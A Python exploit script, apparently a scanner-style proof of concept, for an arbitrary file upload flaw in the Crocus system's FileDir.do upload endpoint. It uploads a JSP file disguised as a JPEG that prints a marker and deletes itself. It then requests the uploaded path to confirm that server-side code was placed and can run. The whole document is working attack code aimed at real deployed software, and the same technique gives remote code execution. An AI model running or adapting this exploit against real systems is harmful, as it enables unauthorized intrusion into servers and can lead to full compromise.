import requests
import argparse
import base64


def main(domain):
    if 'http' in domain:
        check(domain)
    else:
        check(f"http://{domain}")


def check(domain):
    url = f"{domain}/FileDir.do?Action=Upload"
    headers = {
        "Host": domain.split('//')[-1].split('/')[0],
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.524.126 Safari/537.36",
        "Connection": "close"
    }

    file_content = '''<%
        out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
        new java.io.File(application.getRealPath(request.getServletPath())).delete();
        %>'''

    files = {
        'file': ('test.jsp', file_content, 'image/jpeg')
    }
    try:
        response1 = requests.post(url=url, headers=headers, files=files, verify=False, timeout=3)
        upload_path = f"/Plugin/FileManage/Temp/{response1.json()['Result']['FileName']}"
        try:
            response2 = requests.get(f"{domain}{upload_path}", headers=headers, verify=False, timeout=3)
            if response2.status_code == 200 and 'e165421110ba03099a1c0393373c5b43' in response2.text:
                print(f"上传成功：{domain}{upload_path}")
            else:
                print(f"上传失败,响应状态码：{response2.status_code}-{domain}")

        except Exception as e:
            print(e)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    banner = """
         ____  _     _  _      _  _      _____
        /  __\/ \ /\/ \/ \__/|/ \/ \  /|/  __/
        |  \/|| | ||| || |\/||| || |\ ||| |  _
        |    /| \_/|| || |  ||| || | \||| |_//
        \_/\_\\____/\_/\_/  \|\_/\_/  \|\____\
                                                                      
        """
    print(banner)
    parse = argparse.ArgumentParser(description="锐明技术Crocus系统 Upload存在任意文件上传")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    # 实例化
    args = parse.parse_args()
    main(args.url)
